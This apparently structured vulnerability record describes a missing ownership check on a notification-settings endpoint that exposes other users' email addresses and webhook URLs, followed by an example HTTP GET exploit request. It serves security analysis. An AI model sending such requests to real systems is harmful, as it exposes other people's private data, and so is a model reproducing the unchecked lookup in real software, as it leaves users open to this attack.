diagnosis: The application queries notification preference records by settingId using findUnique. It does not check if the notification setting record belongs to req.user.id. Any authenticated user can read email addresses, webhook URLs, and alert notification triggers configured by other users.
exploit_request:
GET /api/settings/notifications/notif_cfg_992184 HTTP/1.1
Host: settings.saas.internal:4045
Authorization: Bearer <user_token>
Accept: application/json
